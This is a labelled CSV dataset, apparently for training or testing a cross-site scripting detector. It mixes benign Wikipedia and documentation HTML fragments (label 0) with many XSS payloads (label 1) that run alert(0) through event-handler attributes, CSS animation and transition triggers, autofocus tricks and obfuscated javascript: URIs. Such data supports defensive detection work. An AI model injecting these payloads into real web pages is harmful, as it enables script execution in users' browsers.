Payload,Label
"</span>. harvard university press. <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a> <a href=""/wiki/special:booksources/0-0-0-0-0"" title=""special:booksources/0-0-0-0-0""><bdi>0-0-0-0-0 </bdi> </a>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=book&rft.btitle=mind+children&rft.pub=harvard+university+press&rft.date=0&rft.isbn=0-0-0-0-0&rft.aulast=moravec&rft.aufirst=hans&rft_id=http://u class=""z0"">",0
<data onblur=alert(0) tabindex=0 id=x></data><input autofocus>,1
"<details onmousemove=""alert(0)"">test</details>",1
"<li><a href=""/wiki/robot_hall_of_fame"" title=""robot hall of fame"">hall of fame </a> </li>",0
<output onpointermove=alert(0)>xss</output>,1
<var id=x tabindex=0 onactivate=alert(0)></var>,1
"<strong draggable=""true"" ondragstart=""alert(0)"">test</strong>",1
"<div style=""padding:0em 0.0em"">",0
<svg><animate onrepeat=alert(0) attributename=x dur=0s repeatcount=0 />,1
</li>,0
</li>,0
<dialog onpointerenter=alert(0)>xss</dialog>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
</span> 0,0
<canvas onpointerover=alert(0)>xss</canvas>,1
"<template onmouseup=""alert(0)"">test</template>",1
"<hgroup onclick=""alert(0)"">test</hgroup>",1
</p>,0
"<style>@keyframes slidein {}</style><pre style=""animation-duration:0s;animation-name:slidein;animation-iteration-count:0"" onanimationiteration=""alert(0)""></pre>",1
"<h0 id=""p-navigation-label"">",0
<spacer onpointerout=alert(0)>xss</spacer>,1
</span>,0
<discard onpointerup=alert(0)>xss</discard>,1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<embed onbeforecopy=""alert(0)"" contenteditable>test</embed>",1
"</span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""http://u july 0 </a>",0
"</span><a href=""/w/index.php?title=artificial_intelligence&action=edit&section=0"" title=""edit section: classifiers and statistical learning methods"">edit </a><span class=""mw-editsection-bracket"">]",0
"<th onmouseleave=""alert(0)"">test</th>",1
"<script draggable=""true"" ondragenter=""alert(0)"">test</script>",1
"<audio autoplay onplay=alert(0)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"</span>. <q>after a half-decade of quiet breakthroughs in artificial intelligence, 0 has been a landmark year. computers are smarter and learning faster than ever. </q> </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=bloomberg+news&rft.atitle=why+0+was+a+breakthrough+year+in+artificial+intelligence&rft.date=0-0-0&rft.aulast=clark&rft.aufirst=jack&rft_id=http://u class=""z0"">",0
"<li><a href=""/wiki/alexey_lyapunov"" title=""alexey lyapunov"">alexey lyapunov </a> </li>",0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
<big onpointerup=alert(0)>xss</big>,1
"<image draggable=""true"" ondragstart=""alert(0)"">test</image>",1
"<meter onmousemove=""alert(0)"">test</meter>",1
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(0) contenteditable>drop here</big>",1
"<details oncopy=""alert(0)"" contenteditable>test</details>",1
"<multicol onkeyup=""alert(0)"" contenteditable>test</multicol>",1
<svg onpointerenter=alert(0)>xss</svg>,1
</span>,0
</span> 0,0
<figure id=x tabindex=0 onbeforeactivate=alert(0)></figure>,1
"<li id=""cite_note-neural_networks-0""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-neural_networks_0-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-neural_networks_0-0""><sup><i><b>b </b> </i> </sup> </a>",0
"<style draggable=""true"" ondrag=""alert(0)"">test</style>",1
"<dt onkeydown=""alert(0)"" contenteditable>test</dt>",1
"<span draggable=""true"" ondragstart=""alert(0)"">test</span>",1
"<bgsound src=""javascript:alert('');"">",1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(0) contenteditable>drop here</link>",1
<caption id=x tabindex=0 ondeactivate=alert(0)></caption><input id=y autofocus>,1
</li>,0
"second <a href=""/wiki/ai_winter"" title=""ai winter"">ai winter </a>:",0
"<li id=""cite_note-sf-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-sf_0-0"">^ </a> </b>",0
<aside id=x tabindex=0 ondeactivate=alert(0)></aside><input id=y autofocus>,1
<blink onpointerenter=alert(0)>xss</blink>,1
"<li id=""cite_note-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-0"">^ </a> </b>",0
"<isindex onkeypress=""alert(0)"" contenteditable>test</isindex>",1
<samp id=x tabindex=0 onbeforedeactivate=alert(0)></samp><input autofocus>,1
"<data draggable=""true"" ondragstart=""alert(0)"">test</data>",1
"<div id=""jump-to-nav""> </div>",0
"<noembed oncontextmenu=""alert(0)"">test</noembed>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
<svg><tt onload=alert(0)></tt>,1
"<mark onmousemove=""alert(0)"">test</mark>",1
"<li><a href=""/wiki/evolutionary_programming"" title=""evolutionary programming"">evolutionary programming </a> </li>",0
</span>,0
<nobr onpointerleave=alert(0)>xss</nobr>,1
"<li><a href=""#citerefcrevier0"">crevier 0 </a>, pp. 0–0, </li>",0
"<li id=""cite_note-learning_in_neural_networks-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-learning_in_neural_networks_0-0"">^ </a> </b>",0
"<style>@keyframes x{}</style><code style=""animation-name:x"" onanimationend=""alert(0)""></code>",1
<plaintext id=x tabindex=0 onfocus=alert(0)></plaintext>,1
"<h0><span class=""mw-headline"" id=""probabilistic_methods_for_uncertain_reasoning"">probabilistic methods for uncertain reasoning",0
"<div class=""magnify""><a href=""/wiki/file:détection_de_personne_-_exemple_0.jpg"" class=""internal"" title=""enlarge""> </a> </div>a self-driving car system may use a neural network to determine which parts of the picture seem to match previous training images of pedestrians, and then model those areas as slow-moving but somewhat unpredictable rectangular prisms that must be avoided.<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup><sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> </div> </div> </div>",0
"<ul><li><a href=""#citerefrussellnorvig0"">russell & norvig 0 </a>, pp. 0–0, </li>",0
"<plaintext onbeforepaste=""alert(0)"" contenteditable>test</plaintext>",1
"</span> <span class=""reference-text"">",0
"<samp onpaste=""alert(0)"" contenteditable>test</samp>",1
<legend onpointerleave=alert(0)>xss</legend>,1
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 0s"" ontransitionend=alert(0)></wbr>",1
"<bgsound onmouseover=""alert(0)"">test</bgsound>",1
"<figcaption draggable=""true"" ondrag=""alert(0)"">test</figcaption>",1
"<h0><span class=""mw-headline"" id=""applications"">applications<span id=""goals"">",0
"<isindex oncut=""alert(0)"" contenteditable>test</isindex>",1
"<section ondblclick=""alert(0)"">test</section>",1
"<li><a href=""#citerefholland0"">holland 0 </a>, </li>",0
"<caption onkeyup=""alert(0)"" contenteditable>test</caption>",1
<dd onfocusout=alert(0) tabindex=0 id=x></dd><input autofocus>,1
"<blockquote onmouseover=""alert(0)"">test</blockquote>",1
"<li><a href=""/wiki/phenomenology_(philosophy)"" title=""phenomenology (philosophy)"">phenomenology </a> </li>",0
<slot onpointerleave=alert(0)>xss</slot>,1
<main id=x tabindex=0 onactivate=alert(0)></main>,1
"<ul><li><a href=""#citerefnewellsimon0"">newell & simon 0 </a>, p. 0 </li>",0
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(0)""></button>",1
"<option onbeforecut=""alert(0)"" contenteditable>test</option>",1
<sup onpointerenter=alert(0)>xss</sup>,1
"</span><a href=""/w/index.php?title=artificial_intelligence&action=edit&section=0"" title=""edit section: computational intelligence and soft computing"">edit </a><span class=""mw-editsection-bracket"">]",0
"<li><a href=""/wiki/general-purpose_computing_on_graphics_processing_units"" title=""general-purpose computing on graphics processing units"">gpgpu </a> </li>",0
</li>,0
<dt onpointerdown=alert(0)>xss</dt>,1
,0
<frame onpointerenter=alert(0)>xss</frame>,1
"</span>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=unknown&rft.jtitle=www-formal.stanford.edu&rft.atitle=applications+of+ai&rft_id=http://u class=""z0"">",0
"<li><a href=""/wiki/deep_learning"" title=""deep learning"">deep learning </a> </li>",0
"<dd><a href=""/en/0.0/"">0.0</a></dd>",0
</span>,0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:templatestyles:r0""/>",0
"<li><a href=""/wiki/programming_team"" title=""programming team"">programming team </a> </li>",0
"<pre onbeforecopy=""alert(0)"" contenteditable>test</pre>",1
<del id=x tabindex=0 onactivate=alert(0)></del>,1
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationend=""alert(0)""></legend>",1
<dir id=x tabindex=0 ondeactivate=alert(0)></dir><input id=y autofocus>,1
<listing onpointermove=alert(0)>xss</listing>,1
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:0%""><a href=""/wiki/human–computer_interaction"" title=""human–computer interaction"">human–computer<br />interaction </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:0px;border-left-style:solid;width:0%;padding:0px"">",0
<select onpointerout=alert(0)>xss</select>,1
"<fieldset draggable=""true"" ondragstart=""alert(0)"">test</fieldset>",1
"<li class=""toctree-l0""><a class=""reference internal"" href=""topics/coroutines.html"">coroutines</a></li>",0
"<li id=""cite_note-hintondengyu0-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-hintondengyu0_0-0"">^ </a> </b>",0
"<h0><span class=""mw-headline"" id=""tools"">tools",0
<body onpointerup=alert(0)>xss</body>,1
"</span><a href=""/w/index.php?title=artificial_intelligence&action=edit&section=0"" title=""edit section: explanatory notes"">edit </a><span class=""mw-editsection-bracket"">]",0
"<dt><a class=""reference internal"" href=""topics/architecture.html""><span class=""doc"">architecture overview",0
"<basefont onmouseleave=""alert(0)"">test</basefont>",1
"<pre draggable=""true"" ondragenter=""alert(0)"">test</pre>",1
"<h0><span class=""mw-headline"" id=""natural_language_processing"">natural language processing",0
<ul>,0
</span>,0
<base id=x tabindex=0 onactivate=alert(0)></base>,1
"<h0 onkeyup=""alert(0)"" contenteditable>test</h0>",1
"<ul><li><a href=""#citerefrussellnorvig0"">russell & norvig 0 </a>, pp. 0–0 </li> </ul>",0
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationstart=""alert(0)""></canvas>",1
"<meta draggable=""true"" ondragleave=""alert(0)"">test</meta>",1
"</span> <span class=""reference-text""><cite class=""citation web"">brooks, rodney (0 november 0). <a rel=""nofollow"" class=""external text"" href=""http://u intelligence is a tool, not a threat"" </a>. archived from <a rel=""nofollow"" class=""external text"" href=""http://u original </a> on 0 november 0. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=unknown&rft.btitle=artificial+intelligence+is+a+tool,+not+a+threat&rft.date=0-0-0&rft.aulast=brooks&rft.aufirst=rodney&rft_id=http://u class=""z0"">",0
"</span>. englewood cliffs, n.j.: prentice-hall. <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a> <a href=""/wiki/special:booksources/0-0-0-0-0"" title=""special:booksources/0-0-0-0-0""><bdi>0-0-0-0-0 </bdi> </a>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=book&rft.btitle=computation:+finite+and+infinite+machines&rft.place=englewood+cliffs,+n.j.&rft.pub=prentice-hall&rft.date=0&rft.isbn=0-0-0-0-0&rft.aulast=minsky&rft.aufirst=marvin&rft_id=http://u class=""z0"">",0
</span> 0,0
"<acronym onbeforepaste=""alert(0)"" contenteditable>test</acronym>",1
<pre id=x tabindex=0 onbeforeactivate=alert(0)></pre>,1
"<wbr onmouseup=""alert(0)"">test</wbr>",1
<head>,0
</section>,0
"</tr><tr><th style=""padding:0.0em"">",0
"</span> (0nd ed.). dover. <a href=""/wiki/international_standard_book_number"" title=""international standard book number"">isbn </a> <a href=""/wiki/special:booksources/0-0-0-0-0"" title=""special:booksources/0-0-0-0-0""><bdi>0-0-0-0-0 </bdi> </a>. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:book&rft.genre=book&rft.btitle=introduction+to+artificial+intelligence&rft.edition=0nd&rft.pub=dover&rft.date=0&rft.isbn=0-0-0-0-0&rft.aulast=jackson&rft.aufirst=philip&rft_id=http://u class=""z0"">",0
</span>,0
"<li><a href=""/wiki/multimedia_database"" title=""multimedia database"">multimedia information system </a> </li>",0
"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(0) contenteditable>drop here</template>",1
"<nobr draggable=""true"" ondragleave=""alert(0)"">test</nobr>",1
"<li><a href=""/wiki/library_(computing)"" title=""library (computing)"">software library </a> </li>",0
<dir onpointerup=alert(0)>xss</dir>,1
<svg><textarea onload=alert(0)></textarea>,1
"<sup id=""cite_ref-0"" class=""reference""><a href=""#cite_note-0"">[0] </a> </sup> this is attributed to the fact that, unlike checkers, physical dexterity has been a direct target of <a href=""/wiki/natural_selection"" title=""natural selection"">natural selection </a> for millions of years.",0
<data id=x tabindex=0 onbeforedeactivate=alert(0)></data><input autofocus>,1
"<source draggable=""true"" ondragleave=""alert(0)"">test</source>",1
"<legend onkeypress=""alert(0)"" contenteditable>test</legend>",1
"<div style=""padding:0em 0.0em"">",0
"<dt><a class=""reference internal"" href=""topics/email.html""><span class=""doc"">sending e-mail",0
"<style>:target {color:red;}</style><content id=x style=""transition:color 0s"" ontransitionend=alert(0)></content>",1
"<style>@keyframes x{}</style><bgsound style=""animation-name:x"" onanimationend=""alert(0)""></bgsound>",1
"<li><a href=""#citerefnilsson0"">nilsson 0 </a>, chpt. 0 </li> </ul>",0
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(0)""></sub>",1
<legend onpointerover=alert(0)>xss</legend>,1
"</span> <span class=""reference-text""><cite class=""citation web"">o'neill, eleanor (0 july 0). <a rel=""nofollow"" class=""external text"" href=""http://u automation and ai"" </a>. <i>icas.com </i>. <a rel=""nofollow"" class=""external text"" href=""http://u </a> from the original on 0 november 0<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">0 november",0
"<time onbeforecut=""alert(0)"" contenteditable>test</time>",1
"<li id=""cite_note-footnoterussellnorvig0-0""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-footnoterussellnorvig0_0-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-footnoterussellnorvig0_0-0""><sup><i><b>b </b> </i> </sup> </a>",0
"<ul><li><i><a href=""/wiki/ignoramus_et_ignorabimus"" title=""ignoramus et ignorabimus"">ignoramus et ignorabimus </a> </i> </li>",0
<svg><blockquote onload=alert(0)></blockquote>,1
<h0 onblur=alert(0) tabindex=0 id=x></h0><input autofocus>,1
"<content oncut=""alert(0)"" contenteditable>test</content>",1
<picture onfocusout=alert(0) tabindex=0 id=x></picture><input autofocus>,1
<bgsound id=x tabindex=0 onbeforeactivate=alert(0)></bgsound>,1
"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(0) contenteditable>drop here</s>",1
"<ul><li><a href=""#citerefrussellnorvig0"">russell & norvig 0 </a>, pp. 0–0, </li>",0
<ul>,0
"<xmp draggable=""true"" ondrag=""alert(0)"">test</xmp>",1
"<style>:target {transform: rotate(0deg);}</style><address id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></address>",1
"<style>:target {transform: rotate(0deg);}</style><bgsound id=x style=""transition:transform 0s"" ontransitionrun=alert(0)></bgsound>",1
"<h0><span class=""mw-headline"" id=""other_sources"">other sources",0
<aside onpointermove=alert(0)>xss</aside>,1
"<dt><a class=""reference internal"" href=""topics/benchmarking.html""><span class=""doc"">benchmarking",0
"<nav data-toggle=""wy-nav-shift"" class=""wy-nav-side"">",0
</span></a></dt><dd>learn about the command-line tool used to manage your scrapy project.</dd>,0
"<li><a href=""/wiki/holographic_data_storage"" title=""holographic data storage"">holographic data storage </a> </li> </ul> </li>",0
"<option onbeforepaste=""alert(0)"" contenteditable>test</option>",1
</li>,0
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:0%""><a href=""/wiki/academic_journal"" title=""academic journal"">journals </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:0px;border-left-style:solid;width:0%;padding:0px"">",0
"<ul><li><img alt=""category"" src=""//upload.wikimedia.org/wikipedia/en/thumb/0/0/folder_hexagonal_icon.svg/0px-folder_hexagonal_icon.svg.png"" decoding=""async"" title=""category"" width=""0"" height=""0"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/0/0/folder_hexagonal_icon.svg/0px-folder_hexagonal_icon.svg.png 0.0x, //upload.wikimedia.org/wikipedia/en/thumb/0/0/folder_hexagonal_icon.svg/0px-folder_hexagonal_icon.svg.png 0x"" data-file-width=""0"" data-file-height=""0"" /> <b><a href=""/wiki/category:robotics"" title=""category:robotics"">category </a> </b> </li>",0
"<div draggable=""true"" contenteditable>drag me</div><th ondrop=alert(0) contenteditable>drop here</th>",1
<sub id=x tabindex=0 onfocusin=alert(0)></sub>,1
discussion:,0
<marquee onstart=alert(0)></marquee>,1
"<big onkeyup=""alert(0)"" contenteditable>test</big>",1
</li>,0
"<li id=""cite_note-the_mathematical_objection-0""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-the_mathematical_objection_0-0"">^ </a> </b>",0
<option onblur=alert(0) tabindex=0 id=x></option><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><table ondrop=alert(0) contenteditable>drop here</table>",1
javas<!-- -->cript:alert(''),1
<figure id=x tabindex=0 onbeforedeactivate=alert(0)></figure><input autofocus>,1
"<li class=""toclevel-0 tocsection-0""><a href=""#references""><span class=""tocnumber"">0",0
"</span> <span class=""reference-text""><cite class=""citation magazine"">schank, roger c. (0). ""where's the ai"". <i>ai magazine </i>. vol. 0 no. 0. p. 0. </cite><span title=""ctx_ver=z0.0-0&rft_val_fmt=info:ofi/fmt:kev:mtx:journal&rft.genre=article&rft.jtitle=ai+magazine&rft.atitle=where's+the+ai&rft.volume=0&rft.issue=0&rft.pages=0&rft.date=0&rft.aulast=schank&rft.aufirst=roger+c.&rfr_id=info:sid/en.wikipedia.org:artificial+intelligence"" class=""z0"">",0
0x0.0x0.0x0.0x0/,1
<image0 onpointerout=alert(0)>xss</image0>,1
"<li><a href=""/wiki/ai_box"" title=""ai box"">ai box </a> </li>",0
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onanimationstart=""alert(0)""></tr>",1
<ruby onpointerdown=alert(0)>xss</ruby>,1
<tr onpointermove=alert(0)>xss</tr>,1
"<div draggable=""true"" contenteditable>drag me</div><dfn ondragover=alert(0) contenteditable>drop here</dfn>",1
"<div id=""glossaries_of_science_and_engineering"" style=""font-size:0%;margin:0 0em"">glossaries of science and engineering </div> </th> </tr><tr><td colspan=""0"" class=""navbox-list navbox-odd"" style=""width:0%;padding:0px"">",0
"<li><a href=""/wiki/three-dimensional_integrated_circuit"" title=""three-dimensional integrated circuit"">three-dimensional integrated circuit </a> </li> </ul>",0
"<dd><a href=""/en/master/"">master</a></dd>",0
"<rtc draggable=""true"" ondragleave=""alert(0)"">test</rtc>",1
"<div role=""note"" class=""hatnote navigation-not-searchable"">main articles: <a href=""/wiki/artificial_neural_network"" title=""artificial neural network"">artificial neural network </a> and <a href=""/wiki/connectionism"" title=""connectionism"">connectionism </a> </div>",0
"<output onkeydown=""alert(0)"" contenteditable>test</output>",1
"<li><a href=""/wiki/cross-validation_(statistics)"" title=""cross-validation (statistics)"">cross-validation </a> </li> </ul>",0
</ol> </div>,0
"<applet onpaste=""alert(0)"" contenteditable>test</applet>",1
"<image onmouseover=""alert(0)"">test</image>",1
</p>,0
"<input ondblclick=""alert(0)"">test</input>",1
"<body onkeypress=""alert(0)"" contenteditable>test</body>",1
"<div id=""sitenotice"" class=""mw-body-content""></div>",0
"<keygen onkeypress=""alert(0)"" contenteditable>test</keygen>",1
,0
"<audio id=x controls onfocus=alert(0) id=x><source src=""validaudio.wav""></audio>",1
"<rt draggable=""true"" ondragleave=""alert(0)"">test</rt>",1
"<td onmousedown=""alert(0)"">test</td>",1
<source onpointerleave=alert(0)>xss</source>,1
